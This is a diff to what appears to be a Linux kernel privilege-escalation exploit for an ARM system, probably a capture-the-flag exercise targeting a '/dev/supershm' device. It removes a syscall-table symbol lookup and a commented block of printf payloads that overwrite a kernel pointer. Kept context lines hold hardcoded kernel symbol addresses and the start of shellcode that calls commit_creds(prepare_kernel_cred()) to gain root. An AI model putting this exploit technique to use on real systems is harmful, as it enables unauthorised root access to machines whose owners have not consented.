@@ -29,8 +29,6 @@
  * 
  * 1. Get symbols
  * 
- *    $ cat /proc/kallsyms | grep T | grep sys_call_table
- *    c0013e68 T sys_call_table
  *    $ cat /proc/kallsyms | grep T |grep prepare_kernel_cred
  *    c00387f4 T prepare_kernel_cred
  *    $ cat /proc/kallsyms | grep T |grep commit_creds
@@ -45,7 +43,6 @@
 #define PAGE_MASK			0xfffff000
 #define PAGE_ALIGN(addr)	(void*)((unsigned int)addr&PAGE_MASK)
 
-#define SYM_sys_call_table	(void *)0xc0013e68
 #define SYM_prepare_creds	(void *)0xc00387f4
 #define SYM_commit_creds	(void *)0xc00384b4
 
@@ -53,16 +50,6 @@
 
 #define shellcode_area		(void *)0x11111110
 
-
-/*
-# WRITE SYS_RMDIR ptr
-printf "cA" > /dev/supershm
-printf "cB" > /dev/supershm
-printf "dA" > /dev/supershm
-printf "cXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\x08\x3f\x01\xc01111AAAA" > /dev/supershm
-printf "uAAAA" > /dev/supershm
-printf "\xb0\xbe\xad\xde:" > /dev/supershm
-*/
 
 // Simple shellcode to call commit_creds(prepare_kernel_cred())
 unsigned char sc[] = "\xff\x5f\x2d\xe9\x01\x00\x00\xeb\x41\x41\x41\x41\x42\x42\x42\x42"
